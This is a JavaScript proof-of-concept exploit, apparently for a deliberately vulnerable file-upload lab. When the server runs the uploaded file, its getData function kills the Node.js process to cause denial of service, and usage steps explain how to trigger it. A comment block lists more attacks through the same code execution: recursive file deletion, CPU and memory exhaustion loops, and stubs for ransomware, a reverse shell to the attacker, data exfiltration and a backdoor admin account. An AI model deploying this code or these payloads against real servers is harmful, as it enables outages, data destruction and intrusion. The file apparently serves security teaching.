/**
 * Server Shutdown Exploit
 * 
 * This file demonstrates a CRITICAL vulnerability in the file upload system.
 * When uploaded and executed by the vulnerable server, it will:
 * - Terminate the Node.js process
 * - Cause complete denial of service (DoS)
 * - Shut down the entire application
 * 
 * USAGE:
 * 1. Login to vulnerable app (http://localhost:3001)
 * 2. Go to Upload File page
 * 3. Upload this file (server-shutdown.js)
 * 4. Server will execute this code and CRASH immediately!
 * 
 * IMPACT:
 * - Complete server shutdown
 * - All users disconnected
 * - Application unavailable
 * - Denial of Service (DoS)
 */

// This function will be called by the vulnerable server
async function getData() {
  // Log the attack
  console.log('\n⚠️  ⚠️  ⚠️  CRITICAL ATTACK DETECTED ⚠️  ⚠️  ⚠️');
  console.log('╔════════════════════════════════════════════════════════╗');
  console.log('║          SERVER SHUTDOWN EXPLOIT EXECUTED!             ║');
  console.log('╚════════════════════════════════════════════════════════╝\n');
  console.log('Attacker has uploaded malicious code!');
  console.log('Server will shutdown in 3 seconds...\n');
  
  // Wait 3 seconds before shutdown
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  console.log('💀 Shutting down server...');
  console.log('🔴 DENIAL OF SERVICE ATTACK SUCCESSFUL!');
  console.log('All users have been disconnected.\n');
  
  // CRITICAL: Force shutdown the Node.js process
  // This will crash the entire server!
  process.exit(1);
  
  // This code never executes because process.exit() terminates immediately
  return [{
    username: 'Server',
    email: 'shutdown@attacker.com',
    password_hash: 'N/A',
    plaintext: 'SERVER_TERMINATED'
  }];
}

// Additional malicious payload (would execute if process.exit didn't run)
// This shows more advanced attacks possible through code execution

/*
ALTERNATIVE ATTACKS POSSIBLE:

1. DELETE ALL FILES:
   const fs = require('fs');
   fs.rmSync('./uploads', { recursive: true, force: true });

2. INFINITE LOOP (CPU exhaustion):
   while(true) { console.log('DoS attack'); }

3. MEMORY EXHAUSTION:
   const bigArray = [];
   while(true) { bigArray.push(new Array(1000000)); }

4. ENCRYPT FILES (Ransomware):
   const crypto = require('crypto');
   // Encrypt all files with random key

5. BACKDOOR INSTALLATION:
   const net = require('net');
   // Create reverse shell to attacker

6. DATA EXFILTRATION:
   const https = require('https');
   // Send all data to attacker's server

7. MODIFY APPLICATION CODE:
   fs.writeFileSync('vulnerable/index.js', maliciousCode);

8. CREATE ADMIN USER:
   users.push({ username: 'hacker', password: hash('backdoor'), email: 'hacker@evil.com' });
*/

// Export for server execution
